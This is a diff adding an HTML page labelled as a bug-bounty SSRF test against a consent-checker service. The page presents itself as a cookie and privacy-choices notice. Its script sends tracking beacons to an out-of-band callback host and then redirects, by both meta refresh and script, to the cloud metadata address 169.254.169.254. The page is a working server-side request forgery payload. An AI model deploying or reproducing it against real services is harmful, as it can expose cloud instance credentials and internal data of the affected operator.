@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>kirasec security research - consent test page</title>
+<meta name="description" content="HackerOne research page (kirasec) - DataGrail Consent Checker SSRF test">
+<meta http-equiv="refresh" content="6;url=http://169.254.169.254/metadata/v1.json">
+</head>
+<body>
+<h1>Your privacy choices</h1>
+<p>We use cookies and similar technologies. Do not sell or share my personal information.</p>
+<p id="s">stage0</p>
+<script>
+(function () {
+  var oob = "3l4ykj81oq5lba8t9mw02sh3wm3okov3g.oob.jfpas.com";
+  var m = "b20bf8257f0f11ab39daf1c1372bef50c";
+  function beacon(tag) { try { new Image().src = "https://" + oob + "/" + m + "-" + tag; } catch (e) {} }
+  beacon("stage1-page-executed");
+  document.getElementById("s").textContent = "stage1";
+  setTimeout(function () {
+    document.getElementById("s").textContent = "stage2";
+    beacon("stage2-navigating-to-linklocal");
+    location.replace("http://169.254.169.254/metadata/v1.json");
+  }, 2500);
+})();
+</script>
+</body>
+</html>
